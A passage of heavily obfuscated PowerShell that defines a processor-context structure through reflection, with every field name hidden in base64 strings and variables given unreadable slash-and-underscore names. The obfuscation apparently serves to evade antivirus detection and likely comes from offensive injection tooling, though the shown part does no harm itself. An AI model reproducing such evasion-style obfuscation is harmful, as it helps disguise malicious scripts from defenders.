        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABiAEQAMQA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x058)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABiAEQAMgA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x060)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABiAEQAMwA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x068)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABiAEQANAA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x070)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABiAEQANQA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x078)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABiAEQANgA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x080)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABiAEQANwA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x088)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAUwAwAA=='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x090)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAUwAxAA=='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x0a0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAUwAyAA=='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x0b0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAUwAzAA=='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x0c0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAVAAwAA=='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x0d0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAVAAxAA=='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x0e0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAVAAyAA=='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x0f0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAVAAzAA=='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x100)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAVAA0AA=='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x110)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAVAA1AA=='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x120)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAVAA2AA=='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x130)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAVAA3AA=='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x140)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAVAA4AA=='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x150)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAVAA5AA=='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x160)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAUwA0AA=='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x170)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAUwA1AA=='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x180)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAUwA2AA=='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x190)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAUwA3AA=='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x1a0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAUwA4AA=='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x1b0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAUwA5AA=='))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x1c0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAUwAxADAA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x1d0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAUwAxADEA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x1e0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAUwAxADIA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x1f0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAUwAxADMA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x200)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAUwAxADQA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x210)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAUwAxADUA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x220)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAUwAxADYA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x230)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAUwAxADcA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x240)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAUwAxADgA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x250)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQAUwAxADkA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x260)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAzADIA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x270)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAzADMA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x280)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAzADQA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x290)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAzADUA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x2a0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAzADYA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x2b0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAzADcA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x2c0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAzADgA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x2d0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgAzADkA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x2e0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA0ADAA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x2f0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA0ADEA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x300)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA0ADIA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x310)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA0ADMA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x320)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA0ADQA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x330)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA0ADUA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x340)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA0ADYA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x350)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA0ADcA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x360)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA0ADgA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x370)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA0ADkA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x380)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA1ADAA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x390)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA1ADEA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x3a0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA1ADIA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x3b0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA1ADMA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x3c0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA1ADQA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x3d0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA1ADUA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x3e0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA1ADYA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x3f0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA1ADcA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x400)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA1ADgA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x410)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA1ADkA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x420)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA2ADAA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x430)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA2ADEA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x440)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA2ADIA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x450)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA2ADMA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x460)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA2ADQA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x470)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA2ADUA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x480)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA2ADYA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x490)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA2ADcA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x4a0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA2ADgA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x4b0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA2ADkA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x4c0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA3ADAA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x4d0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA3ADEA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x4e0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA3ADIA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x4f0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA3ADMA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x500)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA3ADQA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x510)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA3ADUA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x520)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA3ADYA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x530)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA3ADcA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x540)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA3ADgA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x550)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA3ADkA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x560)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA4ADAA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x570)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA4ADEA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x580)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA4ADIA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x590)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA4ADMA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x5a0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA4ADQA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x5b0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA4ADUA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x5c0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA4ADYA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x5d0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA4ADcA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x5e0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA4ADgA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x5f0)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA4ADkA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x600)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA5ADAA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x610)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA5ADEA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x620)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA5ADIA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x630)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA5ADMA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x640)
        (${__/\_/\___/\_____}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAHQARgA5ADQA'))), ${_/=\_/\__/\/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0x650)
